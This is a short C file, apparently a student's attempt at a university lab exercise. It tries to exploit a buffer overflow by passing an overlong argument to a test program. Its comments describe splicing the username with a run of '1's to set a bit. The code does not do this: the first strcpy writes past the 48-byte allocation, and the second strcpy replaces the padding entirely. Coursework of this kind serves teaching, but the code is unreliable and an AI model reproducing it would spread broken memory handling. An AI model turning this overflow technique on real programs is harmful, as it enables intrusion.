// Authors: marteinns19,eirkurb19 [replace with your RU login IDs]
// Group: 69 [replace with your group number]
#include <stdlib.h>
#include "run_program.h"
#include "exploit_program.h"
#include <string.h>
#include <stdio.h>
#include <unistd.h>

//#define _POSIX_C_SOURCE 199506L

int getlogin_r(char *username, size_t size);



int exploit_program(char *prog, char *message) {
	// This code passes the tests, because it provides the right password
	// This (unmodified) code will not pass the final tests, because we will use a different password
	// Only solutions that actually perform a buffer-overflow exploit will be accepted:
	//

	// Make message be 48 bits where the last one is positive
	
	// Malloc to make space for message
	// Splice the message, username, and "1111111111111111111111" together so the bit nr. 48 is positive

	message = malloc(48);
	char username[32];
	getlogin_r(username,sizeof(username));
	strcpy(message, "111111111111111111111111111111111111111111111111");
	strcpy(message,username);

	
	
	// Prepare parameters
	char *argv[]={
		"12345678",
		message,
		NULL
	};

	// run the program
	return run_program(prog, argv);

	// 
}
